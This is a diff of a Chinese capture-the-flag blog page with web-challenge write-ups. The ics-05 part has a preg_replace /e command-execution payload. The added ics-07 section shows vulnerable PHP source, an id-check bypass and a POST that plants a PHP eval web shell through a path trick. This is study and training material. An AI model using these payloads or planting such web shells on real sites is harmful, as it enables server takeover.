@@ -62,9 +62,9 @@ url = &#39;http://111.198.29.45:52536/down,">
 
         </div>
         <div class="content markdown">
-            <h1 id="ics-02"><a href="#ics-02" class="headerlink" title="ics-02"></a>ics-02</h1><p><img src="/2021/10/21/xctf-web-ics/image-20211021194840915.png" alt="image-20211021194840915"></p>
-<p><img src="/2021/10/21/xctf-web-ics/image-20211021194859118.png" alt="image-20211021194859118"></p>
-<p><img src="/2021/10/21/xctf-web-ics/image-20211021194916590.png" alt="image-20211021194916590"></p>
+            <h1 id="ics-02"><a href="#ics-02" class="headerlink" title="ics-02"></a>ics-02</h1><p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021194840915.png" alt="image-20211021194840915"></p>
+<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021194859118.png" alt="image-20211021194859118"></p>
+<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021194916590.png" alt="image-20211021194916590"></p>
 <p><strong>sql注入：</strong></p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">import</span> random
@@ -126,14 +126,87 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 </ul>
 <p>subject中有要搜索的pattern的内容，同时将在replacement前加上/e，触发/e漏洞，就可以执行replacement中的正确的php代码</p>
 <pre><code>?pat=/1/e&amp;rep=system('cd%20s3chahahaDir/flag%26%26%20ls')&amp;sub=1</code></pre>
-<p><img src="/2021/10/21/xctf-web-ics/image-20211021185006756.png" alt="image-20211021185006756"></p>
+<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021185006756.png" alt="image-20211021185006756"></p>
 <pre><code>?pat=/1/e&amp;rep=system("cat%20s3chahahaDir/flag/flag.php")&amp;sub=1</code></pre>
-<p><img src="/2021/10/21/xctf-web-ics/image-20211021184911923.png" alt="image-20211021184911923"></p>
+<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021184911923.png" alt="image-20211021184911923"></p>
 <h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>扫描后台</p>
 <p>id爆破</p>
 <p>字典生成：</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> m <span class="token keyword">in</span>  range <span class="token punctuation">(</span><span class="token number">100001</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre>
+<h1 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a>ics-07</h1><p>view-source</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>page<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>page<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>page<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
+      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: ?page=flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token delimiter">?></span>
+
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+      page <span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>page<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+      id <span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.phps<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>view<span class="token operator">-</span>source<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>
+
+    <span class="token delimiter">&lt;?php</span>
+     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+       <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'con'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+       <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+       <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"backup/"</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">;</span>
+
+       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/.+\.ph(p[3457]?|t|tml)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Bad file extension"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+            <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'uploaded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token punctuation">}</span>
+     <span class="token punctuation">}</span>
+     <span class="token delimiter">?></span>
+
+    <span class="token delimiter">&lt;?php</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'1'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span>
+        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select * from cetc007.user where id='$id'"</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_object</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token variable">$result</span> <span class="token operator">=</span> False<span class="token punctuation">;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+
+      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br >something wae wrong ! &lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"id: "</span><span class="token punctuation">.</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"name:"</span><span class="token punctuation">.</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
+        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> True<span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+     <span class="token delimiter">?></span></code></pre>
+<ul>
+<li>floatval（$ _ GET [id]）！==‘1’ //浮点不为1</li>
+<li>substr（$ _ GET [id]，-1）===’9‘ //id最后一位为9</li>
+</ul>
+<pre><code>?page=1&amp;id=1–9&amp;submit=提交查询#</code></pre>
+<ul>
+<li>chdir(‘uploaded’)//修改上传目录到uploaded下</li>
+</ul>
+<p>POST:</p>
+<pre><code> con=&lt;?php @eval($_POST['a']);?&gt;&amp;file=../1.php/.</code></pre>
+<p>蚁剑连接：</p>
+<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211026204857317.png" alt="image-20211026204857317"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
@@ -165,7 +238,7 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
     </div>
     
         <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-02"><span class="toc-number">1.</span> <span class="toc-text">ics-02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-05"><span class="toc-number">2.</span> <span class="toc-text">ics-05</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-06"><span class="toc-number">3.</span> <span class="toc-text">ics-06</span></a></li></ol>	
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-02"><span class="toc-number">1.</span> <span class="toc-text">ics-02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-05"><span class="toc-number">2.</span> <span class="toc-text">ics-05</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-06"><span class="toc-number">3.</span> <span class="toc-text">ics-06</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-07"><span class="toc-number">4.</span> <span class="toc-text">ics-07</span></a></li></ol>	
         </div>
     
 </div>
